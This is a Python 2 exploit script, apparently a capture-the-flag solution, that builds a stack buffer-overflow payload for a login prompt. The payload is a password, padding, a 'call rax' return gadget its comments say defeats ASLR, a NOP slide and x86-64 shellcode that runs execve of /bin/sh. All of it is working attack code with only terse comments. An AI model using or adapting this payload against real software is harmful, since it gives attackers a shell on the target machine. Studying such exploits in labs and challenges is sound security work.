#!/bin/env python2
import struct
print "alkeryn\n"
login = "patate123?"
padding = (48 - len(login)) * "A"

rbp = struct.pack("L",0x5455ddf748903108) #ended up being useless
ret = struct.pack("L",0x400538) #call rax, since rax always contains the adress of the 2nd line of the stack, defeats ASLR

shellcode = ""
shellcode += "\xeb\x10" #jump forward past the modified byte to 00 to land in nop
shellcode += "\x90"*0x10 # nop slide, 1 byte is gonna be changed to 00 but we jump over
shellcode += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = ""
payload += ret
payload += shellcode

print login+padding+rbp+payload
